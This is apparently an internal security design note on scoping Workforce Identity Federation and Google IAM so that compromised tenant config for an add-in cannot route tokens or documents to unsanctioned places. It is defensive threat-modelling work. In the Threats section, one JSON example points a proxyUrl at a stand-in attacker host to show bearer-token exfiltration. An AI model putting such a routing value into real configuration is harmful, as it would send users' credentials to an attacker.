# WIF and Google IAM scoping for tenant config safety

ADR-0009 makes a design rule: tenant config can select and route only inside trust that already exists. This document records the Google-side enforcement layer that backs that rule.

Code validation is not enough. Zod can reject invalid config, but Google IAM must make compromised config non-useful even if a validation bug exists.

## Threats

### Token exfiltration through proxy routing

A tenant-editable field such as:

```json
{ "proxyUrl": "https://evil.example/proxy" }
```

would cause the add-in to send a federated bearer token to an attacker-controlled origin. HTTPS validation does not mitigate this. ADR-0009 therefore permits only `proxyRef`, resolved through a build-time allowlist or same-origin policy.

### Content exfiltration through engine routing

A malicious `projectNumber`, `location`, or `engineId` could route user document state to an unsanctioned Gemini Enterprise / Discovery Engine resource. ADR-0009 therefore requires engine allowlists plus Google IAM boundaries.

## Enforcement layers

```text
TenantConfig schema
  rejects malformed or unknown config

Release profile
  rejects out-of-envelope surfaces, features, scopes, and providers

Proxy and engine allowlists
  reject unknown proxyRef/project/location/engine combinations

WIF provider condition
  rejects unexpected tenant/app tokens before Google credentials are minted

Google IAM binding
  limits the resulting workforce principal to sanctioned project/resource access
```

## Attribute mapping

Map immutable Entra claims into WIF attributes. The exact claim names depend on the token used by the implementation; keep the mapping explicit and tested.

Example:

```text
assertion.tid -> attribute.tenant_id
assertion.oid -> google.subject
assertion.aud -> attribute.client_id
```

If the token path uses `azp` or another authorized-party claim for the app id, map that claim explicitly and update the provider condition accordingly.

Do not use display names, email aliases, or mutable group names as security principals.

## Provider condition

The provider condition must restrict accepted tokens to the expected tenant and app:

```text
attribute.tenant_id == "<tenant-guid>"
&& attribute.client_id == "<expected-entra-app-id>"
```

For multi-tenant deployments, prefer one condition per tenant/provider or another scheme that still prevents a token from an arbitrary Entra tenant being accepted into the same pool.

## IAM binding

Grant only the minimum required role on the sanctioned Google project or narrower supported resource.

Shape:

```text
principalSet://iam.googleapis.com/locations/global/workforcePools/<pool-id>/attribute.tenant_id/<tenant-guid>
  -> <minimum required Gemini Enterprise / Discovery Engine role>
  -> projects/<sanctioned-project>
```

Where the target API supports resource-level IAM beneath the project, prefer the narrower binding. If only project-level binding is practical, the engine allowlist remains mandatory defense-in-depth.

## Engine allowlist

Runtime config resolution must validate the final engine tuple:

```ts
interface AllowedEngine {
  readonly projectNumber: string;
  readonly location: string;
  readonly engineId: string;
}
```

The resolved engine must match one allowlisted tuple. A tenant config field may not introduce a new project, location, or engine id.

## Negative validation matrix

Test these failure cases before tenant alpha:

| Case | Expected result |
|---|---|
| Wrong Entra tenant id | WIF token exchange rejected |
| Wrong Entra app/client id | WIF token exchange rejected |
| Valid tenant/app but unsanctioned Google project | Google API denied |
| Valid project but unknown engine id | client config resolver rejects before call |
| Unknown proxyRef | client config resolver rejects before token is sent |
| Arbitrary proxyUrl in config | schema rejects |
| Missing engine location | schema rejects; no implicit global fallback |
| Engine tuple outside release profile | release-profile intersection rejects |

## Diagnostics

Diagnostics may report:

```text
wif_provider_rejected
wif_token_exchange_failed
google_iam_denied
engine_not_allowlisted
proxy_ref_not_allowlisted
```

Diagnostics must not include raw tokens, subject tokens, Google access tokens, or full server response bodies that may contain sensitive identity material.
